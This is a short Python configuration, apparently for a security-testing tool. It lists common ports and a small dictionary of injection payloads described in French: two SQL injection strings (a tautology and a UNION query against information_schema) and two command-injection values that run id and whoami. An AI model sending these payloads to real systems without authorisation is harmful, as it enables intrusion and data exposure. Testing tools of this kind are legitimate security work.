# Configuration
COMMON_PORTS = {
    21: "FTP",
    22: "SSH",
    23: "Telnet",
    25: "SMTP",
    80: "HTTP",
    443: "HTTPS",
    445: "SMB",
    3306: "MySQL",
    3389: "RDP",
    8080: "HTTP-Proxy"
}

PAYLOAD_DICT = {
    "SQL Injection - Basic": {
        "code": "SELECT id, username FROM users WHERE id = 1 OR 1=1",
        "description": "Injection SQL simple pour tester la vulnérabilité"
    },
    "SQL Injection - Union": {
        "code": "SELECT id, username FROM users WHERE id = 1 UNION SELECT table_name, NULL FROM information_schema.tables",
        "description": "Injection SQL UNION avec validation"
    },
    "Command Injection - Basic": {
        "code": "$(id)",
        "description": "Injection de commande simple"
    },
    "Command Injection - Advanced": {
        "code": "`whoami`|base64",
        "description": "Injection de commande avec encodage"
    }
}